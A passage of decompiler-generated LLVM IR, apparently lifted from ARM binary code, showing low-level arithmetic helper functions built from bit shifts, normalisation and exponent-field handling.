  %v1_1d4e8 = add i32 %v1_1d4c4, 32
  store i32 %v1_1d4e8, i32* @lr, align 4
  %v0_1d4f0 = load i32, i32* @r3, align 4
  %v2_1d4f0 = add i32 %v1_1d4c4, 31
  %v3_1d4f0 = lshr i32 -2147483648, %v2_1d4f0
  %v4_1d4f0 = and i32 %v0_1d4f0, %v3_1d4f0
  %v5_1d4f0 = icmp ne i32 %v4_1d4f0, 0
  %v6_1d4f0 = shl i32 %v0_1d4f0, %v1_1d4e8
  %v2_1d4f4 = or i32 %v6_1d4f0, 2
  %v2_1d4f4.v6_1d4f0 = select i1 %v5_1d4f0, i32 %v2_1d4f4, i32 %v6_1d4f0
  store i32 %v2_1d4f4.v6_1d4f0, i32* %ip.global-to-local, align 4
  %v0_1d4f8 = load i32, i32* @r0, align 4
  %v7_1d4f8 = ashr i32 %v0_1d4f0, %v1_1d4e4
  %v8_1d4f8 = add i32 %v0_1d4f8, %v7_1d4f8
  store i32 %v8_1d4f8, i32* %r0.global-to-local, align 4
  %v0_1d4fc = load i32, i32* @r1, align 4
  %v2_1d4fc = and i32 %v0_1d4f0, 1073741824
  %v3_1d4fc = icmp ne i32 %v2_1d4fc, 0
  %v4_1d4fc = ashr i32 %v0_1d4f0, 31
  %v6_1d4fc = add i32 %v0_1d4fc, %v4_1d4fc
  %v7_1d4fc = zext i1 %v3_1d4fc to i32
  %v8_1d4fc = add i32 %v6_1d4fc, %v7_1d4fc
  br label %dec_label_pc_1d500

dec_label_pc_1d500:                               ; preds = %dec_label_pc_1d4cc, %dec_label_pc_1d4e4
  %storemerge = phi i32 [ %v11_1d4dc, %dec_label_pc_1d4cc ], [ %v8_1d4fc, %dec_label_pc_1d4e4 ]
  %v0_1d500 = phi i32 [ %v11_1d4dc, %dec_label_pc_1d4cc ], [ %v8_1d4fc, %dec_label_pc_1d4e4 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_1d500 = and i32 %v0_1d500, -2147483648
  store i32 %v1_1d500, i32* @r5, align 4
  %v1_1d504 = icmp sgt i32 %v0_1d500, -1
  call void @__pseudo_cond_branch(i1 %v1_1d504, i32 ptrtoint (i32* @global_var_1d514.1162 to i32))
  %v0_1d508 = load i32, i32* %ip.global-to-local, align 4
  %v1_1d508 = sub i32 0, %v0_1d508
  store i32 %v1_1d508, i32* %ip.global-to-local, align 4
  %v2_1d508 = icmp eq i32 %v0_1d508, 0
  %v0_1d50c = load i32, i32* %r0.global-to-local, align 4
  %v2_1d50c = icmp eq i1 %v2_1d508, false
  %v5_1d50c = sext i1 %v2_1d50c to i32
  %v6_1d50c = sub i32 %v5_1d50c, %v0_1d50c
  store i32 %v6_1d50c, i32* %r0.global-to-local, align 4
  %v7_1d50c = zext i1 %v2_1d50c to i32
  %v8_1d50c = icmp ne i32 %v6_1d50c, %v7_1d50c
  %v9_1d50c = icmp ne i32 %v0_1d50c, -1
  %v10_1d50c = or i1 %v9_1d50c, %v8_1d50c
  %v11_1d50c = icmp ne i32 %v0_1d50c, 0
  %v12_1d50c = select i1 %v2_1d50c, i1 %v10_1d50c, i1 %v11_1d50c
  %v0_1d510 = load i32, i32* %r1.global-to-local, align 4
  %v5_1d510 = sext i1 %v12_1d50c to i32
  %v6_1d510 = sub i32 %v5_1d510, %v0_1d510
  store i32 %v6_1d510, i32* @r1, align 4
  ret i32 %v6_1d50c

; uselistorder directives
  uselistorder i1 %v2_1d50c, { 1, 2, 0 }
  uselistorder i32 %v0_1d50c, { 1, 2, 0 }
  uselistorder i32 %v8_1d4fc, { 1, 0 }
  uselistorder i32 %v0_1d4f0, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_1d4dc, { 1, 0 }
  uselistorder i32 %v1_1d4d8, { 1, 0, 2 }
  uselistorder i32 %v0_1d4d0, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1d500, { 1, 0 }
}

define i32 @function_1d514(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1d514:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = trunc i64 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_1d514 = load i32, i32* %r1.global-to-local, align 4
  %v3_1d518 = icmp ult i32 %v0_1d514, 1048574
  br i1 %v3_1d518, label %dec_label_pc_1d55c, label %dec_label_pc_1d51c

dec_label_pc_1d51c:                               ; preds = %dec_label_pc_1d514
  %v3_1d520 = icmp ult i32 %v0_1d514, 2097150
  br i1 %v3_1d520, label %dec_label_pc_1d540, label %dec_label_pc_1d524

dec_label_pc_1d524:                               ; preds = %dec_label_pc_1d51c
  %v1_1d524 = urem i32 %v0_1d514, 2
  %v2_1d524 = icmp ne i32 %v1_1d524, 0
  %v3_1d524 = udiv i32 %v0_1d514, 2
  store i32 %v3_1d524, i32* %r1.global-to-local, align 4
  %v0_1d528 = load i32, i32* %r0.global-to-local, align 4
  %v3_1d528 = zext i1 %v2_1d524 to i32
  %v6_1d528 = zext i32 %v0_1d528 to i64
  %v7_1d528 = sub i32 33, %v0_1d528
  %v8_1d528 = zext i32 %v7_1d528 to i64
  %v9_1d528 = shl i64 %v6_1d528, %v8_1d528
  %v10_1d528 = sub i32 32, %v0_1d528
  %v11_1d528 = shl i32 %v3_1d528, %v10_1d528
  %v12_1d528 = zext i32 %v11_1d528 to i64
  %v14_1d528 = or i64 %v12_1d528, %v9_1d528
  %v15_1d528 = trunc i64 %v14_1d528 to i32
  %v16_1d528 = add i32 %v0_1d528, -1
  %v17_1d528 = shl i32 1, %v16_1d528
  %v18_1d528 = and i32 %v17_1d528, %v0_1d528
  %v19_1d528 = icmp ne i32 %v18_1d528, 0
  store i32 %v15_1d528, i32* %r0.global-to-local, align 4
  %v0_1d52c = load i32, i32* @ip, align 4
  %v3_1d52c = zext i1 %v19_1d528 to i32
  %v6_1d52c = zext i32 %v0_1d52c to i64
  %v7_1d52c = sub i32 33, %v0_1d52c
  %v8_1d52c = zext i32 %v7_1d52c to i64
  %v9_1d52c = shl i64 %v6_1d52c, %v8_1d52c
  %v10_1d52c = sub i32 32, %v0_1d52c
  %v11_1d52c = shl i32 %v3_1d52c, %v10_1d52c
  %v12_1d52c = zext i32 %v11_1d52c to i64
  %v14_1d52c = or i64 %v12_1d52c, %v9_1d52c
  %v15_1d52c = trunc i64 %v14_1d52c to i32
  store i32 %v15_1d52c, i32* @ip, align 4
  %v0_1d530 = load i32, i32* @r4, align 4
  %v1_1d530 = add i32 %v0_1d530, 1
  store i32 %v1_1d530, i32* @r4, align 4
  %v3_1d534 = mul i32 %v1_1d530, 2097152
  %v2_1d538 = icmp ugt i32 %v3_1d534, -4194305
  call void @__pseudo_cond_branch(i1 %v2_1d538, i32 ptrtoint (i32* @global_var_1d6f0.1163 to i32))
  br label %dec_label_pc_1d540

dec_label_pc_1d540:                               ; preds = %dec_label_pc_1d55c, %dec_label_pc_1d51c, %dec_label_pc_1d524
  %v0_1d540 = load i32, i32* @ip, align 4
  %v2_1d540 = icmp slt i32 %v0_1d540, 0
  %v6_1d540 = icmp eq i32 %v0_1d540, -2147483648
  %v1_1d544 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_1d540, label %bb, label %dec_label_pc_1d540._crit_edge

bb:                                               ; preds = %dec_label_pc_1d540
  %v2_1d544 = urem i32 %v1_1d544, 2
  %v3_1d544 = icmp ne i32 %v2_1d544, 0
  br label %dec_label_pc_1d540._crit_edge

dec_label_pc_1d540._crit_edge:                    ; preds = %dec_label_pc_1d540, %bb
  %v1_1d548 = phi i1 [ %v3_1d544, %bb ], [ %v2_1d540, %dec_label_pc_1d540 ]
  %v2_1d548 = zext i1 %v1_1d548 to i32
  %v3_1d548 = add i32 %v2_1d548, %v1_1d544
  store i32 %v3_1d548, i32* %r0.global-to-local, align 4
  %v0_1d54c = load i32, i32* %r1.global-to-local, align 4
  %v1_1d54c = load i32, i32* @r4, align 4
  %v2_1d54c = and i32 %v1_1d54c, 4096
  %v3_1d54c = icmp ne i32 %v2_1d54c, 0
  %v4_1d54c = mul i32 %v1_1d54c, 1048576
  %v6_1d54c = add i32 %v4_1d54c, %v0_1d54c
  %v7_1d54c = zext i1 %v3_1d54c to i32
  %v8_1d54c = add i32 %v7_1d54c, %v6_1d54c
  %v1_1d550 = load i32, i32* @r5, align 4
  %v2_1d550 = or i32 %v1_1d550, %v8_1d54c
  store i32 %v2_1d550, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  ret i32 %v3_1d548

dec_label_pc_1d55c:                               ; preds = %dec_label_pc_1d514
  %v0_1d55c = load i32, i32* @ip, align 4
  %v1_1d55c = icmp slt i32 %v0_1d55c, 0
  %v2_1d55c = mul i32 %v0_1d55c, 2
  store i32 %v2_1d55c, i32* @ip, align 4
  %v0_1d560 = load i32, i32* %r0.global-to-local, align 4
  %v3_1d560 = mul i32 %v0_1d560, 2
  %v4_1d560 = zext i1 %v1_1d55c to i32
  %v5_1d560 = or i32 %v3_1d560, %v4_1d560
  store i32 %v5_1d560, i32* %r0.global-to-local, align 4
  %v9_1d560 = icmp ule i32 %v5_1d560, %v0_1d560
  %v10_1d560 = icmp ult i32 %v3_1d560, %v0_1d560
  %v11_1d560 = select i1 %v1_1d55c, i1 %v9_1d560, i1 %v10_1d560
  %v3_1d564 = mul i32 %v0_1d514, 2
  %v4_1d564 = zext i1 %v11_1d560 to i32
  %v5_1d564 = or i32 %v4_1d564, %v3_1d564
  store i32 %v5_1d564, i32* %r1.global-to-local, align 4
  %v1_1d568 = and i32 %v3_1d564, 1048576
  %v2_1d568 = icmp eq i32 %v1_1d568, 0
  %v0_1d56c = load i32, i32* @r4, align 4
  %v1_1d56c = add i32 %v0_1d56c, -1
  store i32 %v1_1d56c, i32* @r4, align 4
  br i1 %v2_1d568, label %bb7, label %dec_label_pc_1d540

bb7:                                              ; preds = %dec_label_pc_1d55c
  ret i32 %v5_1d560

; uselistorder directives
  uselistorder i32 %v0_1d560, { 1, 2, 0 }
  uselistorder i1 %v1_1d55c, { 1, 0 }
  uselistorder i32 %v1_1d544, { 1, 0 }
  uselistorder i32 %v0_1d540, { 1, 0 }
  uselistorder i32 %v0_1d52c, { 1, 0, 2 }
  uselistorder i32 %v0_1d528, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_1d540._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1d540, { 0, 2, 1 }
}

define i32 @function_1d574() local_unnamed_addr {
dec_label_pc_1d574:
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i32, align 4
  %v0_1d574 = load i32, i32* @r1, align 4
  %v2_1d574 = icmp eq i32 %v0_1d574, 0
  br i1 %v2_1d574, label %bb38, label %bb

bb:                                               ; preds = %dec_label_pc_1d574
  br label %.thread

bb38:                                             ; preds = %dec_label_pc_1d574
  %v1_1d58010 = load i32, i32* @r0, align 4
  store i32 %v1_1d58010, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb38
  %v0_1d5dc = phi i32 [ %v0_1d574, %bb ], [ %v1_1d58010, %bb38 ]
  %v1_1d594 = phi i32 [ 20, %bb ], [ 52, %bb38 ]
  %v2_1d58c = icmp ugt i32 %v0_1d5dc, 65535
  br i1 %v2_1d58c, label %bb39, label %.thread3

bb39:                                             ; preds = %.thread
  %v2_1d590 = and i32 %v0_1d5dc, 32768
  %v3_1d590 = icmp eq i32 %v2_1d590, 0
  %v4_1d590 = udiv i32 %v0_1d5dc, 65536
  br i1 %v3_1d590, label %.thread3, label %bb40

bb40:                                             ; preds = %bb39
  %v2_1d594 = add nsw i32 %v1_1d594, -16
  br label %.thread3

.thread3:                                         ; preds = %bb39, %.thread, %bb40
  %v1_1d5a0 = phi i32 [ %v1_1d594, %.thread ], [ %v1_1d594, %bb39 ], [ %v2_1d594, %bb40 ]
  %v1_1d59c = phi i32 [ %v0_1d5dc, %.thread ], [ %v4_1d590, %bb39 ], [ %v4_1d590, %bb40 ]
  %v2_1d598 = icmp ugt i32 %v1_1d59c, 255
  br i1 %v2_1d598, label %bb41, label %.thread4

bb41:                                             ; preds = %.thread3
  %v2_1d59c = and i32 %v1_1d59c, 128
  %v3_1d59c = icmp eq i32 %v2_1d59c, 0
  %v4_1d59c = udiv i32 %v1_1d59c, 256
  br i1 %v3_1d59c, label %.thread4, label %bb42

bb42:                                             ; preds = %bb41
  %v2_1d5a0 = add nsw i32 %v1_1d5a0, -8
  br label %.thread4

.thread4:                                         ; preds = %bb41, %.thread3, %bb42
  %v1_1d5ac = phi i32 [ %v1_1d5a0, %.thread3 ], [ %v1_1d5a0, %bb41 ], [ %v2_1d5a0, %bb42 ]
  %v1_1d5a8 = phi i32 [ %v1_1d59c, %.thread3 ], [ %v4_1d59c, %bb41 ], [ %v4_1d59c, %bb42 ]
  %v2_1d5a4 = icmp ugt i32 %v1_1d5a8, 15
  br i1 %v2_1d5a4, label %bb43, label %.thread5

bb43:                                             ; preds = %.thread4
  %v2_1d5a8 = and i32 %v1_1d5a8, 8
  %v3_1d5a8 = icmp eq i32 %v2_1d5a8, 0
  %v4_1d5a8 = udiv i32 %v1_1d5a8, 16
  br i1 %v3_1d5a8, label %.thread5, label %bb44

bb44:                                             ; preds = %bb43
  %v2_1d5ac = add nsw i32 %v1_1d5ac, -4
  br label %.thread5

.thread5:                                         ; preds = %bb43, %.thread4, %bb44
  %v1_1d5b4 = phi i32 [ %v1_1d5ac, %.thread4 ], [ %v1_1d5ac, %bb43 ], [ %v2_1d5ac, %bb44 ]
  %v1_1d5bc = phi i32 [ %v1_1d5a8, %.thread4 ], [ %v4_1d5a8, %bb43 ], [ %v4_1d5a8, %bb44 ]
  %v2_1d5b0 = icmp ugt i32 %v1_1d5bc, 3
  br i1 %v2_1d5b0, label %bb45, label %.thread6

bb45:                                             ; preds = %.thread5
  %v2_1d5b4 = add i32 %v1_1d5b4, -2
  br label %bb46

.thread6:                                         ; preds = %.thread5
  %v5_1d5b8 = udiv i32 %v1_1d5bc, 2
  %v6_1d5b8 = sub i32 %v1_1d5b4, %v5_1d5b8
  br label %bb46

bb46:                                             ; preds = %bb45, %.thread6
  %v0_1d5bc = phi i32 [ %v6_1d5b8, %.thread6 ], [ %v2_1d5b4, %bb45 ]
  %v4_1d5bc = udiv i32 %v1_1d5bc, 8
  %v5_1d5bc = sub i32 %v0_1d5bc, %v4_1d5bc
  store i32 %v5_1d5bc, i32* @r3, align 4
  %v2_1d5c0 = add i32 %v5_1d5bc, -32
  %v4_1d5c0 = sub i32 31, %v5_1d5bc
  %v5_1d5c0 = and i32 %v4_1d5c0, %v5_1d5bc
  %v8_1d5c0 = icmp eq i32 %v5_1d5bc, 32
  %v6_1d5c4 = icmp slt i32 %v5_1d5bc, 32
  br i1 %v6_1d5c4, label %dec_label_pc_1d5c8, label %dec_label_pc_1d5e8

dec_label_pc_1d5c8:                               ; preds = %bb46
  %v2_1d5c8 = add i32 %v5_1d5bc, -20
  %v7_1d5cc = icmp sgt i32 %v2_1d5c0, -12
  br i1 %v7_1d5cc, label %dec_label_pc_1d5d0, label %dec_label_pc_1d5e4

dec_label_pc_1d5d0:                               ; preds = %dec_label_pc_1d5c8
  store i32 %v5_1d5bc, i32* @ip, align 4
  %v1_1d5d4 = sub i32 32, %v5_1d5bc
  %v6_1d5d8 = shl i32 %v0_1d5dc, %v5_1d5bc
  store i32 %v6_1d5d8, i32* @r0, align 4
  %v6_1d5dc = lshr i32 %v0_1d5dc, %v1_1d5d4
  store i32 %v6_1d5dc, i32* %r1.global-to-local, align 4
  br label %.thread31

dec_label_pc_1d5e4:                               ; preds = %dec_label_pc_1d5c8
  %v8_1d5c8 = icmp eq i32 %v2_1d5c8, 0
  %v4_1d5c8 = add i32 %v5_1d5bc, 2147483616
  %v5_1d5c8 = and i32 %v2_1d5c8, %v4_1d5c8
  br label %dec_label_pc_1d5e8

dec_label_pc_1d5e8:                               ; preds = %bb46, %dec_label_pc_1d5e4
  %v1_1d5f4.in = phi i32 [ %v2_1d5c0, %bb46 ], [ %v2_1d5c8, %dec_label_pc_1d5e4 ]
  %v6_1d5f4 = phi i32 [ %v2_1d5c0, %bb46 ], [ %v5_1d5bc, %dec_label_pc_1d5e4 ]
  %v2_1d5f4.in = phi i32 [ %v5_1d5c0, %bb46 ], [ %v5_1d5c8, %dec_label_pc_1d5e4 ]
  %v0_1d5f4 = phi i1 [ %v8_1d5c0, %bb46 ], [ %v8_1d5c8, %dec_label_pc_1d5e4 ]
  %v1_1d5f4 = icmp slt i32 %v1_1d5f4.in, 0
  %v2_1d5f4 = icmp slt i32 %v2_1d5f4.in, 0
  %v3_1d5e8 = xor i1 %v2_1d5f4, %v1_1d5f4
  %v4_1d5e8 = or i1 %v0_1d5f4, %v3_1d5e8
  br i1 %v4_1d5e8, label %bb47, label %bb48

bb47:                                             ; preds = %dec_label_pc_1d5e8
  %v6_1d5e8 = sub i32 32, %v6_1d5f4
  store i32 %v6_1d5e8, i32* @ip, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_1d5e8, %bb47
  %v6_1d5ec = shl i32 %v0_1d5dc, %v6_1d5f4
  store i32 %v6_1d5ec, i32* %r1.global-to-local, align 4
  br i1 %v4_1d5e8, label %bb49, label %.thread31

bb49:                                             ; preds = %bb48
  %v6_1d5f0 = load i32, i32* @r0, align 4
  %v7_1d5f0 = load i32, i32* @ip, align 4
  %v12_1d5f0 = lshr i32 %v6_1d5f0, %v7_1d5f0
  %v13_1d5f0 = or i32 %v12_1d5f0, %v6_1d5ec
  store i32 %v13_1d5f0, i32* %r1.global-to-local, align 4
  %v11_1d5f4 = shl i32 %v6_1d5f0, %v6_1d5f4
  store i32 %v11_1d5f4, i32* @r0, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb48, %dec_label_pc_1d5d0, %bb49
  %v6_1d5fc = phi i32 [ %v6_1d5dc, %dec_label_pc_1d5d0 ], [ %v13_1d5f0, %bb49 ], [ %v6_1d5ec, %bb48 ]
  %v0_1d5f8 = load i32, i32* @r4, align 4
  %v2_1d5f8 = sub i32 %v0_1d5f8, %v5_1d5bc
  store i32 %v2_1d5f8, i32* %r4.global-to-local, align 4
  %v4_1d5f8 = xor i32 %v0_1d5f8, %v5_1d5bc
  %v5_1d5f8 = xor i32 %v2_1d5f8, %v0_1d5f8
  %v6_1d5f8 = and i32 %v5_1d5f8, %v4_1d5f8
  %v7_1d5f8 = icmp slt i32 %v6_1d5f8, 0
  %v8_1d5f8 = icmp slt i32 %v2_1d5f8, 0
  %v5_1d5fc = icmp slt i32 %v0_1d5f8, %v5_1d5bc
  br i1 %v5_1d5fc, label %.thread8, label %bb50

bb50:                                             ; preds = %.thread31
  %v10_1d5fc = mul i32 %v2_1d5f8, 1048576
  %v11_1d5fc = add i32 %v10_1d5fc, %v6_1d5fc
  %v7_1d600 = load i32, i32* @r5, align 4
  %v8_1d600 = or i32 %v7_1d600, %v11_1d5fc
  store i32 %v8_1d600, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread31, %bb50
  %v3_1d608 = xor i1 %v8_1d5f8, %v7_1d5f8
  %v4_1d608 = xor i1 %v3_1d608, true
  call void @__pseudo_cond_branch(i1 %v4_1d608, i32 %tmp33)
  %v0_1d60c = load i32, i32* %r4.global-to-local, align 4
  %v2_1d610 = sub i32 -32, %v0_1d60c
  store i32 %v2_1d610, i32* %r4.global-to-local, align 4
  %v6_1d614 = icmp sgt i32 %v0_1d60c, -32
  br i1 %v6_1d614, label %dec_label_pc_1d618, label %dec_label_pc_1d658

dec_label_pc_1d618:                               ; preds = %.thread8
  %v1_1d618 = add i32 %v2_1d610, 12
  store i32 %v1_1d618, i32* %r4.global-to-local, align 4
  %v8_1d61c = icmp sgt i32 %v1_1d618, 0
  br i1 %v8_1d61c, label %dec_label_pc_1d63c, label %dec_label_pc_1d620

dec_label_pc_1d620:                               ; preds = %dec_label_pc_1d618
  %v1_1d620 = add i32 %v2_1d610, 32
  %v1_1d624 = sub i32 0, %v2_1d610
  %v0_1d628 = load i32, i32* @r0, align 4
  %v6_1d628 = lshr i32 %v0_1d628, %v1_1d620
  %v1_1d62c = load i32, i32* %r1.global-to-local, align 4
  %v7_1d62c = shl i32 %v1_1d62c, %v1_1d624
  %v8_1d62c = or i32 %v7_1d62c, %v6_1d628
  %v0_1d630 = load i32, i32* @r5, align 4
  %v7_1d630 = lshr i32 %v1_1d62c, %v1_1d620
  %v8_1d630 = or i32 %v0_1d630, %v7_1d630
  store i32 %v8_1d630, i32* @r1, align 4
  %v2_1d634 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1d634, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @lr, align 4
  ret i32 %v8_1d62c

dec_label_pc_1d63c:                               ; preds = %dec_label_pc_1d618
  %v1_1d63c = sub i32 0, %v2_1d610
  %v1_1d640 = add i32 %v2_1d610, 32
  %v0_1d644 = load i32, i32* @r0, align 4
  %v6_1d644 = lshr i32 %v0_1d644, %v1_1d640
  %v1_1d648 = load i32, i32* %r1.global-to-local, align 4
  %v7_1d648 = shl i32 %v1_1d648, %v1_1d63c
  %v8_1d648 = or i32 %v7_1d648, %v6_1d644
  %v0_1d64c = load i32, i32* @r5, align 4
  store i32 %v0_1d64c, i32* @r1, align 4
  %v2_1d650 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1d650, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @lr, align 4
  ret i32 %v8_1d648

dec_label_pc_1d658:                               ; preds = %.thread8
  %v0_1d658 = load i32, i32* %r1.global-to-local, align 4
  %v6_1d658 = lshr i32 %v0_1d658, %v2_1d610
  %v0_1d65c = load i32, i32* @r5, align 4
  store i32 %v0_1d65c, i32* @r1, align 4
  %v2_1d660 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1d660, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @lr, align 4
  ret i32 %v6_1d658

; uselistorder directives
  uselistorder i32 %v2_1d610, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v2_1d5f8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1d5f8, { 2, 0, 1, 3 }
  uselistorder i32 %v6_1d5ec, { 1, 0, 2 }
  uselistorder i32 %v2_1d5c0, { 1, 0, 2 }
  uselistorder i32 %v5_1d5bc, { 6, 0, 5, 7, 3, 9, 2, 8, 4, 10, 11, 1, 13, 12, 14 }
  uselistorder i32 %v4_1d5a8, { 1, 0 }
  uselistorder i32 %v1_1d5a8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1d59c, { 1, 0 }
  uselistorder i32 %v1_1d59c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1d590, { 1, 0 }
  uselistorder i32 %v0_1d5dc, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder i32* %r1.global-to-local, { 5, 3, 4, 0, 1, 2, 6, 7 }
  uselistorder i32 -12, { 3, 1, 2, 4, 13, 14, 5, 16, 17, 6, 18, 19, 15, 12, 11, 10, 9, 8, 20, 21, 22, 23, 7, 24, 25, 26, 0 }
  uselistorder i32 -20, { 1, 3, 2, 0 }
  uselistorder i32 -2, { 12, 11, 13, 19, 2, 4, 5, 3, 14, 15, 16, 0, 8, 7, 17, 21, 22, 23, 24, 6, 10, 9, 20, 18, 1 }
  uselistorder i32 -4, { 18, 2, 19, 49, 50, 51, 52, 53, 54, 0, 1, 48, 20, 55, 21, 22, 73, 74, 75, 6, 23, 24, 25, 76, 77, 78, 7, 26, 27, 28, 79, 80, 81, 8, 29, 30, 82, 17, 16, 83, 84, 85, 15, 14, 13, 12, 31, 32, 33, 34, 35, 5, 36, 3, 37, 4, 86, 11, 38, 45, 46, 47, 39, 10, 60, 61, 62, 9, 63, 64, 65, 40, 59, 66, 67, 68, 69, 70, 71, 41, 72, 56, 57, 58, 42, 43, 44 }
  uselistorder i32 15, { 10, 11, 3, 13, 0, 15, 6, 7, 8, 9, 1, 16, 17, 2, 12, 4, 5, 14 }
  uselistorder i32 -8, { 14, 15, 1, 36, 16, 17, 18, 37, 19, 20, 21, 22, 23, 24, 13, 12, 6, 11, 10, 9, 8, 25, 26, 27, 28, 29, 40, 41, 30, 31, 42, 32, 43, 35, 7, 33, 34, 2, 38, 39, 3, 4, 5, 0 }
  uselistorder i32 128, { 16, 15, 8, 9, 6, 7, 10, 20, 19, 0, 11, 1, 2, 12, 21, 22, 3, 4, 13, 23, 5, 17, 24, 14, 18 }
  uselistorder i32 255, { 8, 9, 5, 12, 13, 4, 6, 7, 11, 0, 1, 2, 3, 14, 15, 10 }
  uselistorder i32 -16, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 5, 4, 3, 1, 16, 17, 18, 19, 20, 21, 2, 0, 22 }
  uselistorder i32 65536, { 1, 2, 3, 0, 4, 5, 6, 7, 9, 8, 14, 10, 15, 11, 16, 12, 17, 13, 18, 19, 20, 24, 21, 25, 22, 26, 23, 27, 29, 28, 30, 64, 63, 62, 65, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 46, 45, 47, 48, 49, 52, 51, 50, 53, 55, 56, 54, 57, 59, 60, 58, 61 }
  uselistorder i32 32768, { 5, 4, 1, 6, 2, 7, 0, 3 }
  uselistorder i32 65535, { 4, 5, 2, 3, 1, 6, 0 }
  uselistorder i32 52, { 1, 17, 13, 3, 5, 4, 6, 15, 11, 18, 16, 7, 14, 12, 19, 20, 2, 21, 0, 22, 23, 8, 9, 10 }
  uselistorder i32 20, { 5, 30, 31, 2, 7, 35, 0, 38, 32, 33, 34, 29, 45, 9, 46, 47, 3, 48, 36, 10, 43, 44, 37, 26, 27, 28, 16, 11, 17, 18, 1, 49, 12, 13, 50, 4, 6, 39, 40, 41, 42, 19, 20, 21, 22, 23, 8, 14, 24, 15, 25 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_1d5e8, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1d668(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_1d668:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_1d668 = load i32, i32* @r4, align 4
  %v2_1d668 = icmp eq i32 %v0_1d668, 0
  %v1_1d66c = xor i32 %arg3, 1048576
  store i32 %v1_1d66c, i32* @r3, align 4
  br i1 %v2_1d668, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_1d668
  %v1_1d670 = load i32, i32* @r1, align 4
  %v2_1d670 = xor i32 %v1_1d670, 1048576
  store i32 %v2_1d670, i32* @r1, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_1d668
  %v1_1d678 = load i32, i32* @r5, align 4
  %v2_1d678 = add i32 %v1_1d678, -1
  store i32 %v2_1d678, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_1d67c = call i32 @function_1d4c0()
  store i32 %v0_1d67c, i32* %r0.global-to-local, align 4
  %v0_1d680 = load i32, i32* @r4, align 4
  %v0_1d680.off = add i32 %v0_1d680, 4194303
  %tmp = icmp ult i32 %v0_1d680.off, 2097152
  %v1_1d710 = load i32, i32* @r5, align 4
  %v1_1d710.off = add i32 %v1_1d710, 4194303
  %tmp44 = icmp ult i32 %v1_1d710.off, 2097152
  br i1 %tmp, label %.thread11, label %bb30

bb30:                                             ; preds = %bb
  br i1 %tmp44, label %bb37, label %dec_label_pc_1d68c

dec_label_pc_1d68c:                               ; preds = %bb30
  %v4_1d68c = icmp eq i32 %v1_1d710, %v0_1d680
  br i1 %v4_1d68c, label %bb31, label %dec_label_pc_1d698

bb31:                                             ; preds = %dec_label_pc_1d68c
  %v2_1d690 = load i32, i32* @r2, align 4
  %v5_1d690 = icmp eq i32 %v2_1d690, %v0_1d67c
  br i1 %v5_1d690, label %dec_label_pc_1d6ac, label %dec_label_pc_1d698

dec_label_pc_1d698:                               ; preds = %dec_label_pc_1d68c, %bb31
  %v2_1d698 = or i32 %v0_1d680, %v0_1d67c
  %v4_1d698 = icmp eq i32 %v2_1d698, 0
  br i1 %v4_1d698, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_1d698
  %v1_1d6a0 = load i32, i32* @r2, align 4
  store i32 %v1_1d6a0, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1d698, %bb32
